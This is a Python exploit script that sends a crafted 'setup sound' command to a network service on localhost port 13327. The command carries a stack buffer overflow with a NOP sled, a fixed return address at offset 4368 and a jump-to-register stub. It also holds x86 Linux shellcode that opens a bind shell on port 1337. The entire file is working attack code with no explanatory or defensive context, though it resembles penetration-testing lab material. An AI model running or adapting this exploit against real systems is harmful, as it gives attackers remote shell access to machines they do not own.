import socket
import struct

addr = ("127.0.0.1",13327)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

shellcode = "\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x5f\x97\x93\xb0\x66\x56\x66\x68\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x57\x89\xe1\xcd\x80\xb0\x66\x43\x56\x56\x57\x89\xe1\xcd\x80\x59\x59\xb1\x02\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\x89\xca\xcd\x80"

offset = 4368
crash = 4379

overflow = "\x90"*100
overflow += shellcode
overflow += "\x90"*(offset - len(overflow))
overflow += struct.pack("<I",0x08134596)
overflow += "\x83\xc0\x0c"
overflow += "\xff\xe0"
overflow += "\x90\x90"

payload = "\x11(setup sound " + overflow + "\x90\x00#"

s.connect(addr)
s.send(payload)
print(s.recv(1024))
s.close()
